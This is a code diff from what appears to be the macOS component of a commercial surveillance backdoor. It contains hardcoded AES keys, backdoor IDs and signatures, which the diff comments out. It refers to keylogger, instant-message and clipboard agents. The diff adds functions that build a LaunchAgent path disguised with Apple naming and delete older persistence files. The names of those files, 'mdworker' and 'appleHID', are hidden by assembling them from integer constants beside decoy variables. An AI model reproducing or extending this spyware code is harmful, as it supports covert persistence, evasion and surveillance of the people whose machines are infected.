@@ -28,39 +28,39 @@
 
 #include "RCSMAVGarbage.h"
 
-// Remember to md5 this
-#ifndef DEV_MODE
-char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
-#else
-char  gLogAesKey[]      = "\xa3\xab\x54\x93\x87\xdb\xaa\xb6\x2c\x50\x4f\x91\xad\xd5\x66\x0e";
-#endif
-
-#ifndef DEV_MODE
-char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
-#else
-char  gConfAesKey[]     = "\x10\x33\x71\x3f\x63\x9c\x1b\x6e\x2f\x5e\xca\xe3\xf5\xb4\x78\x81";
-#endif
-
-// Instance ID (20 bytes) unique per backdoor/user
-char gInstanceId[]  = "bg5etG87q20Kg52W5Fg1";
-
-// Backdoor ID (16 bytes) (NULL terminated)
-#ifndef DEV_MODE
-char gBackdoorID[]    = "av3pVck1gb4eR2d8"; // default
-#else
-char gBackdoorID[16]  = "RCS_0000000800";
-#endif
-
-// Challenge Key
-#ifndef DEV_MODE
-char gBackdoorSignature[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
-#else
-char gBackdoorSignature[] = "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99";
-#endif
-
-// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
-// allora e' in demo altrimenti no demo.
-char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
+//// Remember to md5 this
+//#ifndef DEV_MODE
+//char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
+//#else
+//char  gLogAesKey[]      = "\xa3\xab\x54\x93\x87\xdb\xaa\xb6\x2c\x50\x4f\x91\xad\xd5\x66\x0e";
+//#endif
+//
+//#ifndef DEV_MODE
+//char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
+//#else
+//char  gConfAesKey[]     = "\x10\x33\x71\x3f\x63\x9c\x1b\x6e\x2f\x5e\xca\xe3\xf5\xb4\x78\x81";
+//#endif
+//
+//// Instance ID (20 bytes) unique per backdoor/user
+//char gInstanceId[]  = "bg5etG87q20Kg52W5Fg1";
+//
+//// Backdoor ID (16 bytes) (NULL terminated)
+//#ifndef DEV_MODE
+//char gBackdoorID[]    = "av3pVck1gb4eR2d8"; // default
+//#else
+//char gBackdoorID[16]  = "RCS_0000000800";
+//#endif
+//
+//// Challenge Key
+//#ifndef DEV_MODE
+//char gBackdoorSignature[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
+//#else
+//char gBackdoorSignature[] = "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99";
+//#endif
+//
+//// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+//// allora e' in demo altrimenti no demo.
+//char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
 
 // gMode specifies all the possible ways the backdoor can behave:
 //  1 - getRootThroughSLI
@@ -90,8 +90,8 @@ NSString *gConfigurationUpdateName  = nil;
 NSString *gInputManagerName         = nil;
 NSString *gKext32Name               = nil;
 NSString *gKext64Name               = nil;
-NSString *gXPCName                  = nil;
-NSString *gMyXPCName                = @"mdworker_server";
+//NSString *gXPCName                  = nil;
+//NSString *gMyXPCName                = @"mdworker_server";
 UInt32    gAgentCrisis              = CRISIS_STOP;
 NSMutableArray  *gAgentCrisisNet    = nil;
 NSMutableArray  *gAgentCrisisApp    = nil;
@@ -107,7 +107,7 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-u_int gVersion        = 2012063001;
+//u_int gVersion        = 2012063001;
 u_int gSkypeQuality   = 0;
 
 // OS version
@@ -1379,6 +1379,79 @@ void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal)
   
   if (wantToRestoreOriginal == NO)
     gOriginalDesktopImage = origImageUrl;
+}
+
+NSString *createLaunchdPlistPath()
+{
+  return [NSString stringWithFormat:@"/Users/%@/%@/%@/%@.%@.%@.%@", 
+                                    NSUserName(), 
+                                    LIBRARY_NSSTRING,
+                                    LAUNCHD_DIR,
+                                    DOMAIN_COM, 
+                                    DOMAIN_APL,
+                                    LAUNCHD_NAME,
+                                    LAUNCHD_EXT];
+}
+
+void removeOldLd()
+{
+  int mdwo = 0x6F77646D;
+  int tmp2 = 0x44349959;
+  char mdworker_str[16];
+  int tmp1 = 0x46672788;
+  int rker = 0x72656B72;
+  
+  tmp1 = 0;
+  tmp2 = 1;
+  
+  memset(mdworker_str, 0, sizeof(mdworker_str));
+  memcpy(mdworker_str,     &mdwo, 4);
+  memcpy(mdworker_str + 4, &rker, 4);
+  
+  NSString *mdwoStr = [NSString stringWithCString: mdworker_str encoding: NSUTF8StringEncoding];
+  
+  NSString *oldLD = [NSString stringWithFormat:@"/Users/%@/%@/%@/%@.%@.%@.%@", 
+                     NSUserName(), 
+                     LIBRARY_NSSTRING,
+                     LAUNCHD_DIR,
+                     DOMAIN_COM, 
+                     DOMAIN_APL,
+                     mdwoStr,
+                     LAUNCHD_EXT];
+  
+  [[NSFileManager defaultManager] removeItemAtPath: oldLD error: nil];
+}
+
+void removeAppleHID()
+{
+  int appl = 0x6C707061;
+  int tmp2 = 0x44349959;
+  char apple_str[16];
+  int eHID = 0x44494865;
+  int tmp1 = 0x423B5562;
+  
+  tmp1 = 0;
+  tmp2 = 1;
+  
+  memset(apple_str, 0, sizeof(apple_str));
+  memcpy(apple_str,     &appl, 4);
+  memcpy(apple_str + 4, &eHID, 4);
+  
+  NSString *applStr = [NSString stringWithCString: apple_str encoding: NSUTF8StringEncoding];
+  
+  NSString *oldLDNoPriv = [NSString stringWithFormat:@"/Users/%@/%@/%@/%@", 
+                     NSUserName(), 
+                     LIBRARY_NSSTRING,
+                     OSAX_FOLDER,
+                     applStr];
+  
+  NSString *oldLDPriv = [NSString stringWithFormat:@"/%@/%@/%@", 
+                           LIBRARY_NSSTRING,
+                           OSAX_FOLDER,
+                           applStr];
+  
+  [[NSFileManager defaultManager] removeItemAtPath: oldLDNoPriv error: nil];
+  [[NSFileManager defaultManager] removeItemAtPath: oldLDPriv error: nil];
 }
 
 #ifdef DEMO_VERSION
